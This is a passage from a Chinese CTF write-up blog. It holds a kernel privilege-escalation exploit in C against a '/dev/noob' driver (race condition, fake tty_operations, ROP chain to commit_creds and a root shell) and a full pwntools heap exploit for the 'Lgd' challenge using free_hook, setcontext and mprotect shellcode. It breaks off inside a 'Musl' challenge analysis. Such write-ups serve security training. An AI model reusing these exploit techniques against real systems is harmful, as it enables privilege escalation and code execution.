 192     8 */</span></span><br><span class="line">    <span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *);                                    <span class="comment">/*   200     8 */</span></span><br><span class="line">    <span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">int</span>);        <span class="comment">/*   208     8 */</span></span><br><span class="line">    <span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> winsize *);                    <span class="comment">/*   216     8 */</span></span><br><span class="line">    <span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> termiox *);               <span class="comment">/*   224     8 */</span></span><br><span class="line">    <span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *, <span class="keyword">struct</span> serial_icounter_struct *); <span class="comment">/*   232     8 */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span>                                 <span class="comment">/*   240     8 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* size: 248, cachelines: 4, members: 31 */</span></span><br><span class="line">    <span class="comment">/* last cacheline: 56 bytes */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ad430</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810ad7e0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_stack = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> has_changed = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> xchg_rax_rsp_r = <span class="number">0xffffffff8101db17</span>;</span><br><span class="line"><span class="type">size_t</span> p_rdi_r = <span class="number">0xffffffff8107f460</span>;</span><br><span class="line"><span class="type">size_t</span> mv_rc4_rdi_p_rbp_r = <span class="number">0xffffffff8101f2f0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getroot</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">void</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">	<span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %3\n&quot;</span></span><br><span class="line">        <span class="string">&quot;push %4\n&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq\n&quot;</span></span><br><span class="line">        :</span><br><span class="line">        :  <span class="string">&quot;r&quot;</span> (user_ss), <span class="string">&quot;r&quot;</span> (user_stack), <span class="string">&quot;r&quot;</span> (user_rflags), <span class="string">&quot;r&quot;</span> (user_cs), <span class="string">&quot;r&quot;</span> (get_shell)</span><br><span class="line">        : <span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">    <span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">    : <span class="string">&quot;=r&quot;</span> (user_cs), <span class="string">&quot;=r&quot;</span> (user_ss), <span class="string">&quot;=r&quot;</span> (user_stack), <span class="string">&quot;=r&quot;</span> (user_rflags) : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">size_t</span> index;</span><br><span class="line">	<span class="type">char</span>* buf;</span><br><span class="line">	<span class="type">size_t</span> size;</span><br><span class="line">	</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_size</span><span class="params">(<span class="type">void</span>* in)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">input</span>* <span class="title">cu_in</span> =</span> in;</span><br><span class="line">	<span class="keyword">while</span>(has_changed == <span class="number">0</span>)&#123;</span><br><span class="line">		cu_in-&gt;size = <span class="number">0x2e0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	save_state();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">fake_tty</span>;</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">	<span class="type">pthread_t</span> t1;</span><br><span class="line">	<span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/noob&quot;</span>, O_RDONLY);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">input</span> <span class="title">current_input</span>;</span></span><br><span class="line">	current_input.index = <span class="number">0</span>;</span><br><span class="line">	current_input.buf = buf;</span><br><span class="line">	current_input.size = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">	pthread_create(&amp;t1, <span class="literal">NULL</span>, change_size, &amp;current_input);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		ioctl(fd1, <span class="number">0x30000</span>, &amp;current_input);</span><br><span class="line">		current_input.size = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	has_changed = <span class="number">1</span>;</span><br><span class="line">	pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// free 0x2e0 chunk</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;maybe freed 0x2e0 chunk\n&quot;</span>);</span><br><span class="line">	ioctl(fd1, <span class="number">0x30001</span>, &amp;current_input);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd2 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;open ptmx error\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;open tty finished\n&quot;</span>);</span><br><span class="line">	<span class="type">size_t</span> fake_stack = xchg_rax_rsp_r &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fake stack %lx---%lx\n&quot;</span>, fake_stack, fake_stack&amp;<span class="number">0xfffff000</span>);</span><br><span class="line">	<span class="type">size_t</span> rop_chain = mmap((<span class="type">void</span> *)(fake_stack&amp;<span class="number">0xfffff000</span>), <span class="number">0x1000</span>, <span class="number">7</span>, <span class="number">0x22</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!rop_chain)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;mmap finished, %lx\n&quot;</span>, rop_chain);</span><br><span class="line">	<span class="type">size_t</span> rop[] = &#123;</span><br><span class="line">		p_rdi_r,</span><br><span class="line">		<span class="number">0x6f0</span>,</span><br><span class="line">		mv_rc4_rdi_p_rbp_r,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		getroot</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;fake_tty, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;memset finished\n&quot;</span>);</span><br><span class="line">	fake_tty.ioctl = xchg_rax_rsp_r;</span><br><span class="line">	<span class="built_in">memcpy</span>((<span class="type">void</span> *)fake_stack, rop, <span class="keyword">sizeof</span>(rop));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;rop memcpy finished\n&quot;</span>);</span><br><span class="line">	<span class="type">size_t</span> ori_tty[<span class="number">0x30</span>/<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	current_input.buf = ori_tty;</span><br><span class="line">	current_input.size = <span class="number">0x30</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;reading buf form kernel\n&quot;</span>);</span><br><span class="line">	ioctl(fd1, <span class="number">0x30003</span>, &amp;current_input);</span><br><span class="line">	ori_tty[<span class="number">3</span>] = &amp;fake_tty;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;(<span class="number">0x30</span>/<span class="number">8</span>);i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>,ori_tty[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">	ioctl(fd1, <span class="number">0x30002</span>, &amp;current_input);</span><br><span class="line">	ioctl(fd2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809211950.png" alt="图片无法显示，请联系作者" title=" ">

<h2 id="Lgd"><a href="#Lgd" class="headerlink" title="Lgd"></a>Lgd</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>程序提供了四种方法<code>add,delete,show,edit</code>。并且使用了<code>prctl</code>函数，不允许调用<code>execve</code>。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809222611.png" alt="图片无法显示，请联系作者" title=" ">

<p>在<code>add,delete</code>函数中存在大量的<code>emmm</code>应该是无关代码吧，观察到好像都是<code>0</code>，我们只需要关注这几个语句就可以了</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809223026.png" alt="图片无法显示，请联系作者" title=" ">

<p><code>add</code>函数按照用户的输入申请相应大小的内存，最大不超过<code>0x1000</code>大小，接着读取<code>0x200</code>字节的输入到<code>bbs</code>段中，并将用户输入的字符串的长度保存在<code>0x603260</code>地址处。<code>bug</code>是堆块列表</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809223225.png" alt="图片无法显示，请联系作者" title=" ">

<p><code>delete</code>函数则将<code>buf[index]</code>中存储的堆块释放掉。<code>puts</code>函数则是将<code>buf[index]</code>即用户的输入输出。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809224002.png" alt="图片无法显示，请联系作者" title=" ">

<p><code>edit</code>函数则按照<code>0x603260</code>位置处存储的长度重新读取用户输入的数据。这里就出现问题了，因为<code>0x603260</code>中存储的是用户输入到<code>bbs</code>段中的数据最大为<code>0x200</code>字节，而我们申请的堆块的大小可以小于<code>0x200</code>，因此造成了堆溢出。</p>
<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><ul>
<li>申请一块<code>unsorted bin</code>并释放，利用堆溢出或者<code>UAF</code>泄露<code>libc</code>基址</li>
<li>利用堆溢出修改<code>fastbin fd</code>指针，<code>fastbin attack</code>配合<code>unsorted bin attack</code>申请堆块到<code>free_hook</code>附近位置，覆盖<code>free_hook</code>指针为<code>setcontext+53</code>的地址</li>
<li>利用<code>setcontext</code>重新获取控制流，调用<code>mprotect</code>将写入<code>shellcode</code>的堆块关闭不可执行保护，执行<code>shellcode</code>。</li>
</ul>
<blockquote>
<p><code>setcontext</code>函数是用来设置用户上下文的，当我们可以小范围的控制执行流，并且知道<code>libc</code>基址的时候可以利用<code>setcontext+53</code>扩大控制范围。<code>int setcontext(const ucontext_t *ucp);</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;: ret    </span><br></pre></td></tr></table></figure>

<p>可以直接使用<code>pwntools</code>中的<code>SigreturnFrame</code>来构造<code>ucontext_t</code>结构体</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">frame.rsp = shellcode_address</span><br><span class="line">frame.rdi = shellcode_address &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br></pre></td></tr></table></figure>

<p><code>rip</code>是执行完<code>setcontext</code>之后需要执行的指令地址，<code>rsp</code>则是执行完<code>rip</code>指令之后再次执行的指令地址，即可以连续控制。</p>
<p>可以利用此调用<code>mprotect</code>关闭不可执行保护之后跳转到<code>shellcode</code>地址去执行。也可以直接构造<code>rop</code>链</p>
</blockquote>
<h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b*0x4022F7&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;______?\n&quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;yes_or_no?\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;new_content ?\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shut</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;1212&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;is your name?&quot;</span>, name)</span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x48</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">88</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">main_arena_address = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line">free_hook_address = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lib address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0x111</span>)</span><br><span class="line">payload +=  p64(main_arena_address + <span class="number">88</span>)+ p64(free_hook_address - <span class="number">0x40</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span> + p64(<span class="number">0x71</span>) + p64(free_hook_address - <span class="number">0x33</span>)</span><br><span class="line"></span><br><span class="line">shellcode_address = <span class="number">0x603060</span>+<span class="number">0x100</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&quot;\x90&quot;</span>*<span class="number">0x100</span> + (p64(shellcode_address+<span class="number">0x8</span>) + asm(shellcode)).ljust(<span class="number">0x100</span>, <span class="string">b&quot;\x90&quot;</span>))</span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">3</span> + p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">frame.rsp = shellcode_address</span><br><span class="line">frame.rdi = shellcode_address &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">bytes</span>(frame))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Musl"><a href="#Musl" class="headerlink" title="Musl"></a>Musl</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>这道题目的<code>libc</code>库时<code>musl libc 1.1.24</code>。程序共提供了四种方法<code>add,delete,edit,show</code>，其中<code>add</code>函数中可以堆溢出一次，<code>show</code>函数只能调用一次。</p>
<p><code>musl</code>的<code>libc</code>是简化版的<code>glibc</code>，其<code>chunk</code>的数据结构与<code>glibc chunk</code>类似，但是没有<code>fastbin</code>这些操作，相同大小的<code>chunk</code>通过一个双向链表链接起来。申请和释放<code>chunk</code>的时候没有进行安全检查，只要是<code>fd,bk</code>指针指向合法的内存就可以。</p>
<h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3><ul>
<li><p>首先，由于<code>chunk</code>是通过双向链表进行连接的，因此释放再申请时，堆块中就残留有<code>libc</code>的地址数据，据此可以泄露出<code>libc</code>的基址。而<code>mmap</code>的第一个参数为<code>0</code>的时候，其映射的地址空间并不是随机的而是和<code>libc</code>基址有着固定的偏移</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200810170032.png" alt="图片无法显示，请联系作者" title=" ">

<p>因此我们也可以得到<code>mmap</code>的地址</p>
</li>
<li><p>由于我们可以控制<code>fd,bk</code>指针，因此可以直接将堆块分配到<code>mmap</code>地址处</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br></pre></td></tr></table></figure>

<p>将<code>prev</code>即<code>fd</code>指针设置为<code>mmap_address+8</code>，那么在对堆块进行<code>unbin</code>的时候，就会将<code>mmap_address+0x20</code>的位置写入<code>binmap</code>的值，而<code>binmap.prev</code>的值会被改写为<code>mmap_address+8</code>，这样我们再次申请一块相同大小的<code>chunk</code>的时候，就会将<code>mmap_address+0x8</code>代表的堆块分配出来。此时的<code>fd,bk</code>指针分别为<code>mmap_address+0x18,mmap_address+0x20</code>，两个内存地址都是可写的，因此没有问题。</p>
</li>
<li><p>此时我们就获得了<code>mmap_address</code>内存区域的任意写权限，可以通过<code>environ</code>泄露<code>stack</code>地址，改写返回地址为<code>rop</code>链<code>getshell</code>。</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 